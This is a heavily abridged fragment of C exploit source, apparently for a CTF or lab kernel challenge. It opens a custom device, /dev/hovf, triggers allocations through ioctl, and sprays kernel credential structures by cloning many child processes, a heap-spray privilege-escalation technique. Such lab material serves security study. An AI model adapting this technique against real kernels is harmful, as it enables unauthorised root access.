...
// gcc -Os -static -masm=intel exp1.c -lutil -o exp1
// home/heap/heap_spray/pgv/exp1
...
{
    printf("\033[31m\033[1m[-] Error: %s\033[0m\n", msg);
    exit(EXIT_FAILURE);
}

void alloc(void)
{
    ioctl(dev_fd, 0x112233);
}
...
int main(int aragc, char **argv, char **envp)
{
    ...
    dev_fd = open("/dev/hovf", O_RDONLY);
    if (dev_fd < 0) {
        err_exit("FAILED to open hovf device!");
    }
    ...
    for (int i = 0; i < CRED_SPRAY_NUM; i++) {
        if (simple_clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND, 
            ...
            printf("[-] failed at cloning %d child\n", i);
